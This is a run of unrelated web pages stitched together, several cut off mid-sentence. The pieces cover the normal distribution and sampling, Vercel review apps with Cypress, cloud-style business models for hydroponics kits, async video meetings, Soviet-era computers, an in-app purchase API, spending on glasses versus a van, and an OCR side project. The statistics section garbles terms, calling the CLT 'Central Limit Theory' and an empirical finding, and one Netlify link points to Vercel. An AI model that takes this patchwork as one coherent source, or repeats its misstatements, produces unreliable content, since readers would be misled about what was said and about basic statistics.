<p>The Normal Distribution ( Bell curve ), seems to be a common pattern we see for a lot of Random Variables that we pick, If a particular Random Variable follows a pattern of particular distribution, then we call it as normally distributed Random Variable. There are a lot of different types of distributions present based on the different characteristics of the Random Variable. In which the Normal Distribution seems to be a universal standard behavior across the board.</p>
<p>There are two key principles around this,</p>
<p>Let's explain this using a simple measure experiment - <strong>Measure height of people across the globe</strong></p>
<p>The measuring process is shown below, </p>
<p><img alt="MeasurePeopleHeight" src="https://haridas.in/images/RandomVariable-HeightRandomVariable.png"></p>
<p>It's not humanly possible to measure all 7+ Billion people's height to get an idea about how it distributed. So this will be done by taking samples randomly from different locations, and repeat this process till we feel the measure is consistent enough or showing convergence properties. ie; the overall properties of the measure ( probability distribution ) isn't changing considerably after N ( finite sample ) measures.</p>
<h4>1. Central Limit Theory ( CLT )</h4>
<blockquote>
<p>An <strong>Average</strong> of Random Variable's distribution tend towards Normal Distribution ( Bell curve ) if we do measure/sample an infinite number of times.</p>
</blockquote>
<p>This observation comes empirically. The averaging operation actually bringing the distributions of different independent and identically distributed (i.i.d.) random variables centered around the global average or Population Average. This is where the CLT has some relation to the Law of Large Number discussed below, which covers the Expected Value of a Random Variable will be stabilized when we sample/measure enough number of time from the event space.</p>
<h4>2. Law of Large Number</h4>
<blockquote>
<p>Sample Mean converges to the population mean.</p>
<p>Sample Mean is the set of events we have measured ie; Random Variables.</p>
</blockquote>
<p>In the above measure of height, we can consider there is an unknown population mean <span>\(\mu\)</span> and population standard deviation <span>\(\sigma\)</span>. We are doing this measure to find this population mean and variance or other properties of the height (<span>\(H\)</span>) random variable. So from the event space, we randomly pick N number of people and measure the height, ( N maybe 1000, or 1Million or so ).</p>
<p>I have discussed the Law of Large Number in another blog post also - <a href="https://haridas.in/expected-value-of-lottery-ticket.html">Expected Value of a Lottery</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As an architect, I think <em>a lot</em> about development workflows. Ever since I read <a href="https://amzn.to/39B0EQ7" target="_blank" rel="noopener">Product Development for the Lean Enterprise</a> many years ago, I can't help but see the process of software development as one big assembly line that needs to be constantly evaluated and optimized.</p><p>How quickly can we start a new project?</p><p>How quickly can we iterate on UI during local development?</p><p><strong>How long does it take to get feedback from your team?</strong></p><p>This last question is where <strong>review apps</strong> are incredibly powerful, so much so that <em>I can't live without them</em>.</p><h2 id="what-are-review-apps">What are review apps?<a href="#what-are-review-apps">#</a></h2><p>Review apps, sometimes referred to as "previews" or "deploy previews" are ephemeral versions of an application, typically deployed from a branch on GitHub or another version control system.</p><p><img src="https://seanconnolly.dev/img/review-applications/review-app.png" alt="Review app"></p><p>Some links in this post are to affiliate sites. If you purchase something through them, I may earn a small commission. It costs you nothing and I’m extremely grateful when you use my links. Thanks!</p><h3 id="where-to-find-review-apps">Where to find review apps<a href="#where-to-find-review-apps">#</a></h3><p>Most modern hosting providers provide some flavor of this capability.</p><p>Vercel supports <a href="https://vercel.com/docs/platform/deployments#preview" target="_blank" rel="noopener">Previews</a>.</p><p>Heroku has <a href="https://devcenter.heroku.com/articles/github-integration-review-apps" target="_blank" rel="noopener">Review Apps</a>.</p><p>Netlify offers <a href="https://vercel.com/docs/platform/deployments#preview" target="_blank" rel="noopener">Deploy Previews</a>.</p><p>...and so on.</p><p>Some definitions of review apps may vary, but in my experience review apps are:</p><ul><li><strong>Deployed from branches</strong>: You don't need to merge your code to your master/main branch in order to deploy.</li><li><strong>Independently addressable</strong>: You can access on a separate domain or subdomain for web apps, or as a separate app download for mobile apps.</li><li><strong>Shareable</strong>: You can send a link or download to anybody you choose.</li><li><strong>Ephemeral</strong>: They are temporary, often destroyed after a branch is merged into master/main or after a period of time.</li></ul><h2 id="how-do-review-apps-work">How do review apps work?<a href="#how-do-review-apps-work">#</a></h2><p>The exact implementation of review apps depends on your hosting provider. In my opinion, <a href="https://vercel.com/" target="_blank" rel="noopener">Vercel</a> has the most elegant solution for review apps (they call them previews) so we will look at their solution more closely. Vercel designed their system from the ground up to support previews, hence why you see <code>Deploy. Preview. Ship.</code> in massive font on their home screen. Heroku, on the other hand, added their review apps to an existing system so their solution does feel a bit more shoe-horned and complicated. In either the case, the same principles apply.</p><h3 id="enabling-review-apps-in-version-control">Enabling review apps in version control<a href="#enabling-review-apps-in-version-control">#</a></h3><p>Vercel previews are enabled by default when you enable the <a href="https://vercel.com/github" target="_blank" rel="noopener">Vercel GitHub integration</a>.</p><p>Below is a screenshot of the GitHub integration settings for the GitHub project that powers the site that you are on right now, seanconnolly.dev.</p><p><img src="https://seanconnolly.dev/img/review-applications/vercel-github.png" alt="Vercel GitHub"></p><p>After I write this sentence, I am going to pause writing to commit and push my changes to GitHub so you can see what this blog post looks like as a Vercel preview.</p><p>Below is a screenshot of what my VS Code IDE looks like right now. In the bottom right, I have a terminal open where I am about to commit my changes and push to GitHub.</p><p><img src="https://seanconnolly.dev/img/review-applications/vscode-screenshot.png" alt="VS Code screenshot"></p><p>In GitHub, I created a pull request for my current branch. With the Vercel GitHub integration enabled, I am able to see this convenient "View deployment" link.</p><p><img src="https://seanconnolly.dev/img/review-applications/view-deployment.png" alt="View deployment"></p><p>Clicking the "View deployment" link navigates me to <a href="https://seanconnolly-r0nt71a73.vercel.app/" target="_blank" rel="noopener">https://seanconnolly-r0nt71a73.vercel.app/</a>, the URL for the preview. If you click the "Why I can't live without review apps" heading, it will take you to the earlier version of the blog post you are reading, including my TODO reminders and probably some typos 😛.</p><h2 id="review-apps-with-backend-services-and-apis">Review apps with backend services and APIs<a href="#review-apps-with-backend-services-and-apis">#</a></h2><p>Review apps work best when the frontend of your application is state<em>less</em>, meaning it doesn't ship with a tightly coupled state<em>ful</em> data store.</p><p>If you did include a data store with your application, anytime you created a review app, meaning a new version of your application, you would also need to copy some or all of the data store. This can be a time-consuming and costly endeavour, depending on the size of your data. There are many other reasons to keep your frontend stateless, and in some cases, like with mobile apps, your frontend is stateless by design. In any case, because <em>I can't live without review apps</em>, I always work with stateless frontend applications.</p><p><strong>So, how do we interface with backend services and APIs?</strong></p><p>There are a number of ways to structure your environments to work with review apps, but my environments normally look like this:</p><p><img src="https://seanconnolly.dev/img/review-applications/review-app-envs.png" alt="Review app environments"></p><p>This is for the smallest use case. With larger team projects, there could be multiple static environments like development, staging, test, etc. and those may also have their own backend APIs. The point here is that your review apps are not expected to have their own copies of your data store and API. Instead they piggyback off of an existing data store that you are already using.</p><h2 id="review-apps-with-automated-tests">Review apps with automated tests<a href="#review-apps-with-automated-tests">#</a></h2><p>Automated test frameworks like <a href="https://cypress.io/" target="_blank" rel="noopener">Cypress</a> allow you to run your tests against a specific URL. Often you will run these tests locally by pointing Cypress to a localhost URL like <code>http://localhost:3000</code>. You can also run your tests against your production environment or another static environment like dev or staging. With Cypress you can set the <code>CYPRESS_baseUrl</code> environment variable to dynamically run your tests against a review app, which as we saw before has a dynamically generated, unique URL. I'll skip the gory details of how we do this in CircleCI, our continuous integration tool, but effectively our Cypress run command looks like this:</p><pre><code><span>CYPRESS_baseUrl</span><span>=</span><span>"https://seanconnolly-r0nt71a73.vercel.app/"</span> <span>npm</span> run cypress
</code></pre><p>While there are many ways to run Cypress in CircleCI and other continuous integration tools, our goal is to run our automated tests in an environment <strong>as close to the production environment as possible</strong> and we find review apps are the best way to do that.</p><h2 id="review-apps-for-teams">Review apps for teams<a href="#review-apps-for-teams">#</a></h2><p>Review apps really shine with cross-functional teams. My team's Clubhouse stories usually look something like this:</p><p><img src="https://seanconnolly.dev/img/review-applications/clubhouse.png" alt="Clubhouse story"></p><p>And our team workflow has these steps:</p><ul><li>Ready for Review</li><li>Ready for QA</li><li>Ready for Design Review</li><li>Ready for Product Review</li></ul><p>(I removed a few other steps that aren't relevant to this post)</p><p>That's a lot of reviews! At each stage, a teammate has an easy way to access the review app and verify whatever they need to.</p><p>In <strong>Ready for Review</strong>, other developers can pull up the review app to check certain types of functionality or to confirm whether or not the code they are reviewing actually results in some kind of defect or odd user behavior. Without review apps, reviewers would need to pull down the branch and run it locally, which is fine, but in my experience is more effort than people care to go through so they often just don't do it.</p><p><strong>Ready for QA</strong> is the most necessary use of review apps for us. QA engineers perform almost all of their tests on review apps. This is also the area where we see the most iteration cycles. When QA finds a bug, the developer needs to track it down locally and then push those changes to their branch, resulting in a new deployment for QA to re-test.</p><p><strong>Ready for Design Review</strong> is applicable when working on larger new features or making significant design changes. Designers don't usually go through the steps to run the app locally so I've often seen teams ship their work to production or a shared development environment in order to get design feedback. Review apps allow design iteration to happen before code gets merged with the main project.</p><p><strong>Ready for Product Review</strong> is where product owners decide whether or not a feature is ready to go to production. Like designers and QA engineers, they benefit from having easy access to the application in a near-exact replica of production before the feature is exposed to real users.</p><p>Though your team may not follow all of these steps in the exact same way, hopefully you can see how many members of your team can benefit from review apps.</p><h2 id="review-apps-for-indie-hackers">Review apps for indie hackers?<a href="#review-apps-for-indie-hackers">#</a></h2><p>When I say <em>I can't live without review apps</em>, I mean it. Even in small projects where I am the only developer, I use review apps extensively. Even with this blog, there are plenty of use cases where review apps come in handy.</p><p>As a member of the <a href="https://bloggingfordevs.com/" target="_blank" rel="noopener">Blogging for Devs</a> community, I am constantly posting review app links in the community to get feedback on my posts before they are exposed to readers and search engines.</p><p>I also participate in community writing programs where I am writing on behalf of companies like LogRocket and Fauna. Their editorial process is more rigorous and I find it most effective to share the review app version of the post that I plan on publishing because it is the most realistic preview I can provide to editors.</p><p>Also, my blog is a side project. I often work on cosmetic or structural changes to the site and I like to be able to test it across multiple devices and browsers without much fuss. The easiest way for me to test things is to push to a branch and open the review app link wherever I want to test. Redeploying to review apps is as easy as running <code>git commit -am "Fixing mobile issue" &amp;&amp; git push</code>, waiting just a minute and refreshing.</p><h2 id="what-review-apps-mean-for-production-deployments">What review apps mean for production deployments<a href="#what-review-apps-mean-for-production-deployments">#</a></h2><p>By adding review apps to your development workflow, production deployments become substantially safer and faster.</p><p>For smaller projects, as soon as I confirm my changes look good in my review app and my automated tests pass, I will merge to master/main and walk away knowing production will be updated momentarily.</p><p>For projects with a larger team, a lot of verification happens before merging to master/main so by the time a branch is ready to go to production, there is a <em>very</em> small chance that anything goes wrong in our continuous deployment pipeline. That said, I generally err on the side of caution when working with products that real people are actively using and paying for so I advocate for running automated tests again and also including some manual verification steps.</p><p>If you are inclined, you can also incorporate review apps into your continuous deployment process where your workflow looks more like this:</p><p><img src="https://seanconnolly.dev/img/review-applications/prod-review-app.png" alt="Production review app"></p><ol><li>This is production steady state where the production domain points to the current version of your app.</li><li>Next, the review app is deployed but only accessible via its unique URL. You can use this for automated testing, manual …</li></ol></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Analogies are everywhere. Take from different fields to increase your perception of your own field.</p>
<p>I recently talked to a company growing and selling in-home hydroponic kits to grow crops in an apartment in the city for example, where most people do not have gardens like in suburbia. Given my experience in the startup world as well as in technology, I thought of their idea for some time and realized that there are quite a few business models that they can go towards, as they had the tech but didn't know how to progress it into an actual business.</p>
<p>Here's the list I came up with:</p>
<ul>
<li><strong>Infrastructure as a Service (IaaS)</strong> - Selling access to the infrastructure (but not the infrastructure itself) with which customers can then do whatever they want
<ul>
<li>Sell access to hydroponics kits (kits) for individuals, restaurants, companies (groups) to grow their own crops, but they have to maintain it themselves</li>
</ul>
</li>
<li><strong>Platform as a Service (PaaS)</strong> - Selling infrastructure with less control over the details but more ease of use for customers
<ul>
<li>Sell access to kits with certain crops already available, and groups can pick what they want to grow, and perhaps customize the crops and crop choice</li>
<li><em>Serverless</em> - Grow crops on demand based on needed capacity</li>
</ul>
</li>
<li><strong>Software as a Service (SaaS)</strong> - Selling access to the product without selling the infrastructure itself to run the product
<ul>
<li>Sell the crops themselves to groups so that they don't need to grow crops themselves</li>
<li>Boutique grocery stores</li>
<li>Delivery of crops on a regular basis</li>
<li>Delivery of meal kits on a regular basis with additional included groceries such as pasta or rice</li>
</ul>
</li>
<li><strong>Desktop as a Service (DaaS)</strong> - Sell remote access to the product
<ul>
<li>Monitor crops from anywhere with a web app or mobile app. The app could show crop yields, stats, expected time to delivery, expected time to expiration, et cetera</li>
<li>Complementary to the other models, not a replacement</li>
</ul>
</li>
<li><strong>On-premise</strong> - Sell the product to be deployed directly on the property of the customer, and sometimes maintain it for them
<ul>
<li>Grow the crops on the premises of the groups and maintain it for them</li>
</ul>
</li>
<li><strong>Self Service</strong> - Selling the infrastructure itself, not just access to it
<ul>
<li>Sell the kits themselves</li>
</ul>
</li>
<li><strong>Distributed Computing</strong> - Selling where the product usage occurs, oftentimes taking a percentage of every sale
<ul>
<li>Allow other people to grow crops and sell them locally</li>
<li>The crowdsourced Uber/Airbnb model</li>
</ul>
</li>
</ul>
<p>This list came up due to my experience in business and technology, but if I had expertise in other fields, then this list would've been different. Learn from different domains and create analogies between them to think of new ideas and combinations of those ideas.</p>

<p><span>The world has changed and nothing will be the same: Companies all around the world are shifting to remote work, employees have been adopting new work habits for more than 8 months now. So let’s be honest, employees won’t return to the office as before. Remote work is no longer a temporary situation. You have to create your future environment of work right now because it’s the new norm.&nbsp;</span></p>
<p><span>So when companies shift suddenly from a 100% office environment to a home environment, what do they do? They shift all their in person meetings to video meetings! Really?? Some even double down on it to be sure their employees are working!!</span></p>
<p><span>What happened? Zoom fatigue became the new popular hashtag and people were less productive and less engaged. And we are not talking about “Zoom bombing”!</span></p>
<p><span>I think we have to completely reinvent the way of working, communicating, collaborating and learning in this new world and not just duplicate what we do in person in a digital form.</span></p>
<p><strong>I BELIEVE THAT THE FUTURE OF WORK IS ASYNC VIDEO COMMUNICATION.</strong></p>
<p><span>Async video meetings are all about optimizing your team’s time, and they are a great way to get information in front of people who don’t have availability for a meeting, or who are working remotely across multiple time zones. When you work in the way I do,having time to think on and internalize information before acting is critical.</span></p>
<p><span>Instead of coordinating schedules, opt to send a quick async video with key info that your remote colleagues can view during normal work hours.</span></p>
<p><span>Asynchronous communication allows people to first absorb and then act on information when they are able to, rather than the moment a piece of information is put in front of them.&nbsp;</span></p>
<p><span>Here are my 5 beliefs to embrace this new world&nbsp; :&nbsp;</span></p>
</div></div></div></div>


<div><div><div><p><h2>1. The remote worker is FREE, completely FREE</h2></p></div></div></div>


<div><div><div><div><p><span>Your employees are working remotely, they decide where and when. They are working from their personal environment, so you don’t oversee how they want to manage their time and where they can or want work. You don’t offer them a work environment anymore so you have to admit that you also lost this power.</span></p>
<p><span>If an employee wants to work from 5am and go hiking or kayaking by 2pm, he can do that!! Why not? Trust me, he will be much more productive.&nbsp;</span></p>
<p><span>Let’s talk about children: When you are working from home, you are sharing the same family space and property. You cannot ask them everyday “Please be quiet, Iwill be on a zoom meeting.”</span></p>
<p><span>Seriously!! I am sure this generation will hate zoom meetings. They are synonyms to online school and now“mom and dad are not available”! You are physically here but not really here, it’s difficult for our loved ones. We need to take that in consideration and not impose our timing on others.&nbsp;</span></p>
<p><span>I encourage your people to work the hours that suit them and their lives, in the middle of what is a stressful time for everyone.</span></p>
<p><span>I think we need to be more respectful of each other’s time and not interrupt with alive meeting each time we need it.&nbsp;</span></p>
<p><span>We need to be more respectful of each others’ home life: We enter each other’s personal space. It’s why weet captures a small portion of your background and you can even blur it.</span></p>
</div></div></div></div>


<div><div><div><p><h2>2. The remote worker is MORE PRODUCTIVE</h2></p></div></div></div>


<div><div><div><div><p><span>With asynchronous communication you allow yourself – or your employees – to put all energy into what you do each time and have better control over your workload.</span></p>
<p><span>In workplaces where asynchronous collaboration is reinforced and enabled with technology, productivity is higher. People can follow their agenda and complete daily tasks more easily when they are able respond to their colleagues’ requests based on bandwidth or set up time slots throughout the week to prepare feedback for specific projects. Plus, by focusing their attention on one task at a time they have a more detailed look and bring in better results.</span></p>
</div></div></div></div>


<div><div><div><p><h2>3. Working remotely = HUMAN &amp; EMOTION</h2></p></div></div></div>


<div><div><div><div><p><span>It’s important to keep a human and emotional connection with our team and clients even if we cannot see them in person. I personally attach great importance to emotional communication where I can see facial expressions, hear a warm voice, and feel others’ mood.&nbsp;</span></p>
<p><span>A lot can be lost in translation in writing, including empathy, body and facial language, and often the attention of the reader when it’s a long note.</span></p>
<p><span>Async videos accomplish a number of things that emails or text chat cannot. They create more of a human connection, which makes it easier to understand each other and makes it clear to the recipient that the ideas being shared are well understood. Async meetings are ideal for giving feedback, because empathy comes through much more clearly when you can see face-to-face or hear a warm voice.</span></p>
<p><span>You’ll be surprised by the power of emojis in a video or just how a voice tonality can say a lot!&nbsp;</span></p>
<p><span>Every person is different and some are not comfortable with the camera. For this reason, we offer the capability to&nbsp; record without the camera but we always show a profile picture in all the videos: It’s a good way to keep a human connection.</span></p>
<p><span>And Weet offers the ability to add filters on your webcam to create a fun environment&nbsp; and make your teammates smile 😉</span></p>
<p><span>We also discovered that&nbsp; async video gives a voice to those who are quieter. Contributing to live meetings can often rely on speaking skills of speed and volume, while async videos let people share their thoughts at their own pace.</span></p>
<p><span>While some people prefer reacting spontaneously others need time to think and video recordings accommodate both approaches to produce a clear “leave-behind” that allows everyone to review feedback at their own speed. </span></p>
</div></div></div></div>


<div><div><div><p><h2>4. STOP CHAT &amp; LONG MEETINGS</h2></p></div></div></div>


<div><div><div><div><p><span>Working remotely equals working alone. It can be difficult to motivate yourself to concentrate.&nbsp;</span></p>
<p><span>Have you ever found it difficult to concentrate on your daily job duties after being interrupted by an unexpected casual chit-chat about a project your colleague is working on? It’s fine if this happens sometimes because mutual support and camaraderie is a critical part of being a team. But what if it interferes with your productivity?</span></p>
<p><span>Avoid being interrupted and interrupted for just asking a question.&nbsp; Divide your time between working time and communicating time.</span></p>
<p><a href="https://blog.doist.com/asynchronous-communication/"><span>Recent research</span></a><span> has shown that we live in a more collaborative era; We schedule our working day around meetings, Slack conversations and emails with our colleagues and sometimes these events could take up </span><a href="https://hbr.org/2016/01/collaborative-overload"><span>80% of a full working day</span></a><span>:&nbsp;</span></p>
<p><span>This can be detrimental to our performance; Technically we spend more time hopping from one meeting to another or replying to messages than focusing solely and mindfully on our tasks.</span></p>
<p><span>For example, I shut down all my notifications and connect only 4 times in the day to check my emails and my weets. What is great is that if someone needs to ask me a question and would need to do it in a live meeting, he can record it and I answer when I am available. You cannot imagine the freedom that it gives me and above all, the time I gain!&nbsp;</span></p>
<p><span>Why async video meetings are so effective : We talk faster than we type and we retain more information when delivery is via video. Plus people can review recorded videos at their own convenience.</span></p>
<p><span>I want to make a clarification : I am not saying to cut off all the live meetings (at least 2/3) but for those that are necessary, put 30min max in your agenda settings. It seems sometimes too short but you will see people will accomodate.</span></p>
</div></div></div></div>





<div><div><div><div><p><span>2020 has been a challenging year, no doubt. But one thing is clear – the way we have adapted will inform how we work for years to come, empowering us all to do the best work of our lives. Allowing people to work at a time and a pace that suits them is key to this.</span></p>
<p><span>In this new remote world, we can hire anywhere in the globe. Embracing async collaboration allows companies to access a wider range of candidates and freelancers all around the world;</span></p>
</div></div></div></div>





<div><div><div><div><p><b>5 tips to embrace async video meetings :&nbsp;</b></p>
<p><span>1- the most important: Emphasize trust, organization &amp; independence: Evaluate people based on their results, not the number of hours spent online or number of emails.</span></p>
<p><span>2 – Be cool with the video as a media: Not everyone is comfortable with a camera, communicate that it’s ok to cut off the webcam. You are not looking for perfection, just authenticity; Your employees can record their video as they talk in a real conversation.</span></p>
<p><span>3 – Create an async culture mindset: Explain how it works, share the benefits, share some examples and ask top management to begin by creating some enthusiastic video messages and above all, share that in async communication, we don’t wait for an immediate answer.</span></p>
<p><span>4 – Ask your employees and teammates for feedback: Does it work? What are their feelings?&nbsp;</span></p>
<p><span>5 – Minimize the number of meetings you have, but don’t blacklist them.&nbsp; The async work communication stack looks something like this:</span></p>
<p><span>80% async video </span></p>
<p><span>15% live video meetings </span></p>
<p><span>5% physical meetings, e.g., annual company or team retreats</span></p>

<p>Non-broken glass, burning lights, live plants inside, modern plastic entrance doors. Except for one floor.</p>
<!-- WP QUADS Content Ad Plugin v. 2.0.17.1 -->


<p>Despite the twilight, the floor remained lifelessly dark. Somewhere in the depths, there was a dim glow of electric light, hardly penetrating through old glass blocks.</p>
<p>Inside the floor was empty and black, but not completely.&nbsp;Inside burned several fluorescent lamps, spotlighting dozens of silhouettes of tall cabinets.</p>
<p>Some of them were covered with darkened translucent film.</p>
<p>The surface of the floor, tables and enclosures covered with black spots of soot, sometimes diluted with white stains of dried extinguishing mixture.</p>
<p>The air felt a persistent, but not strong smell of burning.&nbsp;The fire walked here a few years ago but did not touch the equipment.</p>
<p>Part of the cabinets were antique electronic computers. Others served to measure signals, and computers controlled this process. Dozens of terminals froze on the tables with extinct screens.</p>

<p>Suddenly it became clear that before them the legendary machine “Saratov-2”.&nbsp;The machine, which was massively placed on many enterprises of the Soviet Union in the 70s, but at the same time, not a single high-quality (I’m not talking about color) photos remained. Not on the Internet, not even in the museum of the enterprise developer.</p>

<p>This computer did not even have a traditional microprocessor. Domestic clone of the popular American PDP-8, Saratov-2 was produced in two versions.</p>
<p>Steel frame, like a chest of drawers, filled with drawers.&nbsp;Different boxes responded to various computer nodes — a twelve-bit computing unit, input-output device interfaces, and RAM.</p>
<p>The memory was ferromagnetic – two boxes of four cubes in each. Reading or writing programs occurred through punched tapes, and to display the results of calculations used electric typewriter CONSUL-260.</p>
<p>The monitor and keyboard in that era were not yet a much-needed</p>
<p>part of the computer. The necessary input of programs into the operative memory was carried out in binary codes, manually using a group of switches on the front panel. Bulbs controlled the correctness of the input.</p>

<p>The next generation of computers was Electronics 100/25. These machines were clones of American PDP-11.</p>
<p>They thought faster, had more memory, allowed them to work with magnetic tape drives and punched tapes, but the general principle remained the same.</p>
<p>It was possible to connect a monitor and a keyboard to this computer, while still having the ability to enter programs through the front switches.</p>

<p>Electronics-60 – the further development of Electronics 100/25. The same architecture, but bulky tape drives are a thing of the past.</p>
<p>They were replaced by flexible eight-inch floppy disks. The new chipset, allowed to fit the processor module, power supply and control devices, in a very compact size.</p>
<p>I note that all these computers were managers, that is, they worked with a bunch of external equipment. It could be machine tools, laboratory complexes, measuring devices.</p>

<p>15VM16-1 some early version of Electronics-60, having a control panel of light bulbs and switches. Assembled on the element base of the previous Electronics 100/25. I occupied a small nightstand built into the table on which the controlled equipment was placed.</p>

<p>DVK-2M or Interactive Computing Complex. Massive, stylish in appearance, the computer of the 80s, which could be considered a personal computer.</p>
<p>It consisted of two desktop blocks – processor and pairing. A set of interchangeable interface cards allowed connecting drives of various types, a monochrome monitor on an openwork leg, and a keyboard.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In-App Purchases (IAP) allow you to build customized purchase experiences for your apps. Using our dead-simple JavaScript API you can ask the user to make purchases dynamically based on your own requirements.</p>
<h2>Adding In-App Products</h2>
<p>To enable IAPs in your app, first, you need to define at least one In-App Product for your app,</p>
<ol>
<li>Go to your <a href="https://www.outpan.com/dev/apps">Developer Dashboard</a>.</li>
<li>Choose the app you would like to enable In-App Purchases for.</li>
<li>From the dashboard page for the selected app, choose <strong>In-App Products</strong>. </li>
<li>Select <strong>New Product</strong> and enter your product's <strong>Name</strong>, <strong>SKU</strong>, and <strong>Price</strong>. Then select <strong>Add Product</strong>.</li>
</ol>
<h2>In-App Purchases in your app</h2>
<ol>
<li>
<p>Add the Outpan JS library to the <code>&lt;head&gt;</code> element of your HTML:</p>
<pre><code>&lt;script type="text/javascript" src="https://js.outpan.com/v1/"&gt;&lt;/script&gt;</code></pre>
</li>
<li>
<p>At the desired point in your application, call the <code>OPRequestPayment</code> function to ask for payment from the user:</p>
<pre><code>OPRequestPayment('SKU-0001', function(resp){
  if(resp.success)
    alert('Payment succeeded.');
  else
    alert('Payment failed.');
});</code></pre>

<p>5 years ago, I bought some new glasses. I found a cheap $60 frame and I was proud. I’ve worn those glasses every waking hour for the last 5 years, which adds up to about 30,000 hours. They’re slightly uncomfortable and I have to push them back up on my nose a few times an hour, but I make do because you can’t argue with that price!</p>



<p>Meanwhile, I recently bought a new minivan to lug the kids around. I could have made do with one for $10,000-ish less, but I wanted a nice shiny one with a DVD player and all that. I use it maybe 30 minutes a day. </p>



<p>I’m realizing lately how backwards that logic is. I saved a couple hundred bucks on glasses and <a href="https://critter.blog/2020/11/06/all-self-help-boils-down-to-choose-long-term-over-short-term/">cursed myself with 30,000 hours</a> of discomfort and annoyance. And I spent an extra $10,000 on something that I barely even use compared to those dang glasses.</p>



<p>I think it makes sense to spend our money where we spend our time. What are the things we spend the most time with? Glasses, shoes, a computer and desk and chair, a bed, a belt, whatever it is. Even if one of those things is <em>slightly</em> worse than it could be, when you multiply that by <a href="https://critter.blog/2020/11/04/what-we-have-left/">a bajillion hours of usage</a>, it explodes.</p>



<p>Say that I had spent $500 on a pair of glasses that felt great. That’s an increase of $440. Divide $440 by 30,000 hours, and it turns out that I’d be paying about 1 penny per hour for that added comfort. No brainer, right? </p>



<p>Now let’s look at the car. If I use that car for 7 years that’s about 1300 hours of driving time. That means that the extra $10,000 comes out to about $7.70 per hour. I’m paying minimum wage to no one in exchange for access to a DVD player we barely use and a van that looks a little nicer.</p>



<p>Never again. Never again will I skimp on glasses and splurge on a car. I don’t even have a commute!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><b>You know</b> the jist by now. 2020. Cringe, shrug and shudder.</p><p>2020 - the year of fabulous missed opportunities.</p><p>Death. Disease. Unemployment. Missed games and events. Disneyland closed. Weddings canceled. All bad? <b>No!</b>👇🏼</p><h2>Chase your dreams because nobody else will</h2><p>When California, and other parts of the world, started shutting things down earlier in the year, and today again, everybody had to make a choice. Here is your extra time, what are you going to do with it?</p><p>You can't do what you did before, and time is constant so you're going to spend it in some way anyway. By conscious choice or not.</p><p>The popular choice was to use it to buy toilet paper. I tried that.</p><p>Having done that and watched a lot of stuff on Netflix, I chose to put some of that extra free time towards things I’ve always wanted to do. One of those is entrepreneurship or at least building some fun side projects.</p><h2>Why you can't lose when you're building side projects</h2><p>I love working on different side projects. Let me break down what's great about them:</p><ol type="1"><li>If you're super successful, you're set for life and you've won the game. Congrats!</li><li>If not, you've anyway built something that's worth something and hey, that's a lot better than nothing!</li><li>If not, you've built something worthless, but you have probably learned something very useful in the process.</li><li>If not, let's go have a beer together and thus you've earned a friend!</li></ol><p>This article is about side projects, so you and your dependants will be fine on your primary income regardless of outcome. Any success will be a bonus, and loss won't mean you lose your home.</p><h2>How I found what to build and why you shouldn't do that</h2><p>Shame on me, but my side project's inspiration was the anti-thesis of what all the cool kids say about how to get started.</p><p>I went technology first.</p><p>Every year I watch some of the sessions from Apple's WWDC event. In 2019 their Vision API caught my eye. It was a highly optimised way to run text recognition right on the users' device and seemed to have pretty good results. The idea lingered and over the course of the next half year I increasingly started noticing when and where it could be applied to the Mac (or PC) environment.</p><p>The common denominator for the problem was this:<!-- --> <b>there’s text on the screen you want to copy, but it cannot be copied.</b></p><p>This happens more often than you realise.</p><p>Maybe the text is on slides in a video or Zoom conference, part of an image, a scanned PDF or a song name in an app like Spotify and the app developer didn’t think that field would get copied.</p><p>Solution is easy, right? Just read it and type it like a 15th century scribe.</p><p>…but that takes time, I’m a millennial, and the butterfly keyboard on my MacBook Pro is flimsy. Besides, I had learned about that nice first-party API so there was not turning back.</p><p>The other technology inspiration was SwiftUI, another cool new framework Apple released the year before that I was dying to try out.</p><p>I guess you could say that my idea was born from a personal need and reading up on tech, but if you have a choice, a personal or even better a broader need is the more important thing to consider.</p><p>That is to say, the priority should be 1) what <b>should</b> <!-- -->be done 2) what <b>could </b>be done.</p><h2>Hatching the idea into a shiny beautiful MVP</h2><p>I had everything I needed. Idea, tech, cool stuff to learn and some time to build it.</p><p>I started working on a text recognition app for the Mac with the idea that this is something I'll personally use. I'll be sure to learn a bunch of cool and useful things along the way and that will be a success in itself if nobody else cares.</p><p>It only took a couple months to put together the first version of the app.</p><p>The core functionality was that you could simply select an area on your screen and any text in that area is machine read and copied to your clipboard. From there on, you could paste to your notes or emails or whatever is appropriate in your workflow. All of this happens pretty much instantaneously, on-device, so it’s fast enough even for short text snippets and completely private for any business purpose!</p><p>I was actually really happy how well it worked and put extra emphasis on ensuring that my first users would also get a similarly great experience. The way to ensure that is through two key focus points:</p><p>1) <b>Usability</b>. UI should be aesthetically pleasing, but more importantly UX has to be functional and intuitive. I focused on building something that is easy to pick up for anyone, trying to follow good design principles and limiting features in the first version.</p><p>2) <b>Robustness</b>. It's better to have less features that work really well than a lot with bugs. This enables a<!-- --> <i><b>positive feedback loop</b></i> <!-- -->where users email you feature requests rather than angry bug reports. That keeps you motivated, your users engaged to your service and gives you healthy backlog where to add stuff.</p><h2>How it's gone so far and has it been worth it</h2><p>Of all the metrics related to apps I value customer satisfaction most.</p><p>The average rating for OwlOCR on the Mac App Store in it's first year so far stands proudly at <b>4.7 out of 5 stars</b> <!-- -->and the app has reached almost<!-- --> <b>2,000 monthly active users</b> - roughly doubling in November which was super exciting!</p><p>I take monthly active users as some measure of stickiness of the app. I mean, it could be downloaded a gazillion times, but if people don't use it, what's the point?</p><p>But there's a more important thing here beyond the numbers.</p><p>Most rewarding thing overall have been the users that have reached out to express their appreciation of the work.</p><p>In these pandemic times with on and off remote apathy, that has been a great source of inspiration and for those taps on the back I’m truly grateful to my fellow internet strangers.</p><p>Has it been worth it? Yes! When there's imposing commands and limitations on your freedom, a fun side project can give you some sense of control.</p><p><b>You can and should still pursue happiness</b>, despite the limitations.</p><p>Side projects can connect you with interesting people, pave way for entrepreneurship or side income and help with isolation depression.</p><p>Even my side project doesn't go to the moon, I've already learned new tech stacks, improved my professional skills, connected with other bootstrappers and learned a lot about miscellaneous stuff like SEO and marketing.</p><p>This year had exciting starting numbers, awesome users and a healthy growth rate, so I'm eagerly looking forward to end of the year and 2021 